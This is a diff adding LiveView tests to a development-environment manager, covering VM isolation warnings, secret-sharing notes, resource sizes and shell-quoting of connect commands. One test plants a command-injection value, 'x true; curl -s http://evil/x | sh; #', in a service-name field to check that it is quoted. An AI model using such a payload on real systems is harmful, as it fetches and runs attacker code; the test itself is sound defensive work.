@@ -93,6 +93,37 @@ defmodule ForemanWeb.PagesTest do
            )
   end
 
+  # Results are checked before they're stored, but rows from before that
+  # weren't, and these commands are pasted into a shell.
+  test "connect commands quote anything that isn't a plain name", %{
+    conn: conn,
+    user: user,
+    repo: repo,
+    box: box
+  } do
+    Application.put_env(:foreman, :tailscale, %{client_id: "c", client_secret: "s"})
+    on_exit(fn -> Application.delete_env(:foreman, :tailscale) end)
+
+    env = environment_fixture(user: user, repo: repo, box: box)
+
+    env =
+      Repo.update!(
+        Ecto.Changeset.change(env,
+          remote_user: "vs code",
+          workspace_folder: "/w/it's here",
+          devcontainer_service: "x true; curl -s http://evil/x | sh; #"
+        )
+      )
+
+    {:ok, view, _html} = live(conn, ~p"/environments/#{env.id}")
+
+    assert view |> element("#exec-command") |> render() =~
+             "docker exec -it -u &#39;vs code&#39; -w &#39;/w/it&#39;&quot;&#39;&quot;&#39;s here&#39; " <>
+               "&#39;#{env.slug}-x true; curl -s http://evil/x | sh; #-1&#39; bash -l"
+
+    assert view |> element("#ssh-command") |> render() =~ "ssh &#39;vs code&#39;@#{env.slug}"
+  end
+
   test "without Tailscale, a started environment says why SSH and VS Code are missing", %{
     conn: conn,
     user: user,
@@ -253,6 +284,199 @@ defmodule ForemanWeb.PagesTest do
 
     {:ok, view, _html} = live(conn, ~p"/boxes")
     refute has_element?(view, "[data-role=policy-alert]")
+  end
+
+  describe "a box that runs each environment in its own VM" do
+    setup %{user: user} do
+      # What a VM box's agent reports: inside each VM, everything is allowed.
+      policy = Map.new(ForemanProtocol.Policy.defaults(), fn {rule, _} -> {rule, "allow"} end)
+      %{vms: box_fixture(owner_user_id: user.id, name: "vms", isolation: "vm", policy: policy)}
+    end
+
+    test "says so wherever it's shown", %{conn: conn, vms: vms, box: box} do
+      {:ok, view, _html} = live(conn, ~p"/boxes/#{vms.id}")
+      assert has_element?(view, "[data-role=isolation]", "VM per environment")
+
+      {:ok, view, _html} = live(conn, ~p"/boxes")
+      assert has_element?(view, "#box-#{vms.id} [data-role=isolation]", "VM per environment")
+      refute has_element?(view, "#box-#{box.id} [data-role=isolation]")
+
+      {:ok, view, _html} = live(conn, ~p"/")
+      assert has_element?(view, "#box-card-#{vms.id} [data-role=isolation]", "VM per environment")
+      refute has_element?(view, "#box-card-#{box.id} [data-role=isolation]")
+    end
+
+    test "warns about its policy inside each VM, not root on the box", %{conn: conn, vms: vms} do
+      {:ok, view, _html} = live(conn, ~p"/boxes/#{vms.id}")
+      assert has_element?(view, "#box-policy-alert[class*=bg-warning-soft]")
+      refute has_element?(view, "#box-policy-alert", "root on the box")
+      assert has_element?(view, "#box-policy-alert", "inside each environment's own VM")
+      assert has_element?(view, "#box-policy-alert", "Privileged code is root in its VM")
+      assert has_element?(view, "#box-policy-alert", "FOREMAN_VM_POLICY")
+      assert has_element?(view, "#box-policy-alert", "privileged=refuse")
+
+      {:ok, view, _html} = live(conn, ~p"/boxes")
+      assert has_element?(view, "#box-#{vms.id} [data-role=policy-alert]", "Privileged in VMs")
+      refute has_element?(view, "#box-#{vms.id}[class*=ring-danger]")
+
+      {:ok, view, _html} = live(conn, ~p"/")
+
+      assert has_element?(
+               view,
+               "#box-card-#{vms.id} [data-role=policy-alert]",
+               "Privileged in VMs"
+             )
+
+      refute has_element?(view, "#box-card-#{vms.id}[class*=ring-danger]")
+    end
+
+    # What a VM doesn't stop, whatever its policy says.
+    test "says what the VM doesn't keep in, even with nothing relaxed", %{
+      conn: conn,
+      user: user
+    } do
+      strict =
+        box_fixture(
+          owner_user_id: user.id,
+          isolation: "vm",
+          policy: ForemanProtocol.Policy.defaults()
+        )
+
+      {:ok, view, _html} = live(conn, ~p"/boxes/#{strict.id}")
+      refute has_element?(view, "#box-policy-alert")
+      assert has_element?(view, "#box-vm-note", "its own VM")
+      assert has_element?(view, "#box-vm-note", "the box's network")
+      assert has_element?(view, "#box-vm-note", "the other environments' VMs")
+      assert has_element?(view, "#box-vm-note", "metadata service")
+      assert has_element?(view, "#box-vm-note", "hypervisor")
+
+      {:ok, view, _html} = live(conn, ~p"/boxes")
+      assert has_element?(view, "#box-#{strict.id} [data-role=isolation][title*=metadata]")
+    end
+
+    test "with privileged refused in its VMs, doesn't talk about privileged code", %{
+      conn: conn,
+      user: user
+    } do
+      policy =
+        ForemanProtocol.Policy.defaults()
+        |> Map.new(fn {rule, _} -> {rule, "allow"} end)
+        |> Map.put("privileged", "refuse")
+
+      box = box_fixture(owner_user_id: user.id, isolation: "vm", policy: policy)
+
+      {:ok, view, _html} = live(conn, ~p"/boxes/#{box.id}")
+
+      assert has_element?(
+               view,
+               "#box-policy-alert",
+               "Each environment's VM accepts more than the default"
+             )
+
+      assert has_element?(view, "#box-policy-alert", "inside each environment's own VM")
+      refute has_element?(view, "#box-policy-alert", "Privileged code")
+      refute has_element?(view, "#box-policy-alert", "privileged=refuse")
+
+      {:ok, view, _html} = live(conn, ~p"/boxes")
+      assert has_element?(view, "#box-#{box.id} [data-role=policy-alert]", "Relaxed in VMs")
+    end
+
+    test "says who can read its environments' secrets", %{conn: conn, vms: vms, box: box} do
+      {:ok, view, _html} = live(conn, ~p"/boxes/#{vms.id}")
+      assert has_element?(view, "#sharing-note", "can't read each other's secrets")
+      assert has_element?(view, "#sharing-note", "root or incus access on the box")
+      refute has_element?(view, "#sharing-note", "Docker")
+
+      {:ok, view, _html} = live(conn, ~p"/boxes/#{box.id}")
+      assert has_element?(view, "#sharing-note", "Anyone with Docker on a box")
+      refute has_element?(view, "#box-vm-note")
+    end
+
+    test "connects to an environment through its VM", %{
+      conn: conn,
+      repo: repo,
+      user: user,
+      vms: vms,
+      box: box
+    } do
+      attrs = [user: user, repo: repo, remote_user: "vscode", workspace_folder: "/workspaces/sf"]
+      env = environment_fixture([box: vms, isolation: "vm"] ++ attrs)
+
+      {:ok, view, _html} = live(conn, ~p"/environments/#{env.id}")
+
+      assert view |> element("#exec-command") |> render() =~
+               "incus exec fm-#{env.id} -- docker exec -it -u vscode -w /workspaces/sf #{env.slug}-app-1 bash -l"
+
+      plain = environment_fixture([box: box, isolation: "container"] ++ attrs)
+      {:ok, view, _html} = live(conn, ~p"/environments/#{plain.id}")
+
+      assert view |> element("#exec-command") |> render() =~
+               ">docker exec -it -u vscode -w /workspaces/sf #{plain.slug}-app-1 bash -l<"
+    end
+  end
+
+  test "an environment its box can't reach after changing isolation says so", %{
+    conn: conn,
+    repo: repo,
+    user: user
+  } do
+    box = box_fixture(owner_user_id: user.id, name: "vms", isolation: "vm")
+
+    env =
+      environment_fixture(
+        user: user,
+        repo: repo,
+        box: box,
+        isolation: "container",
+        observed_state: "missing",
+        memory_limit_mb: 2048
+      )
+
+    {:ok, view, _html} = live(conn, ~p"/environments/#{env.id}")
+    assert has_element?(view, "#isolation-changed", "#{env.slug} was made as containers")
+    assert has_element?(view, "#isolation-changed", "vms now runs environments in VMs")
+    assert has_element?(view, "#isolation-changed", "Change the box back")
+    refute has_element?(view, "button[phx-value-do=start]")
+    refute has_element?(view, "button[phx-value-do=rebuild]")
+    refute has_element?(view, "#resources", "Its VM's size")
+
+    {:ok, view, _html} = live(conn, ~p"/")
+    refute has_element?(view, ~s|button[phx-click=start][phx-value-id="#{env.id}"]|)
+
+    # The same environment on a box that still runs containers.
+    plain =
+      environment_fixture(
+        user: user,
+        repo: repo,
+        isolation: "container",
+        observed_state: "missing"
+      )
+
+    {:ok, view, _html} = live(conn, ~p"/")
+    assert has_element?(view, ~s|button[phx-click=start][phx-value-id="#{plain.id}"]|)
+
+    {:ok, view, _html} = live(conn, ~p"/environments/#{plain.id}")
+    refute has_element?(view, "#isolation-changed")
+    assert has_element?(view, "button[phx-value-do=start]")
+    assert has_element?(view, "button[phx-value-do=rebuild]")
+  end
+
+  test "an environment in a VM is counted at the VM's size", %{
+    conn: conn,
+    repo: repo,
+    user: user
+  } do
+    box = box_fixture(owner_user_id: user.id, name: "vms", isolation: "vm")
+    vm = %{"name" => "fm-x", "cpus" => 4, "memory_mb" => 8192}
+    env = environment_fixture(user: user, repo: repo, box: box, isolation: "vm", vm: vm)
+
+    {:ok, view, _html} = live(conn, ~p"/environments/#{env.id}")
+    assert has_element?(view, "#resources", "4.0 CPUs, 8.0 GiB")
+    assert has_element?(view, "#resources", "Its VM's size")
+
+    {:ok, view, _html} = live(conn, ~p"/boxes/#{box.id}")
+    assert has_element?(view, "#box-env-#{env.id} td", "8.0 GiB")
+    assert has_element?(view, "#box-env-#{env.id} td", "its VM's size")
   end
 
   test "adding a box shows a one-time install command", %{conn: conn} do
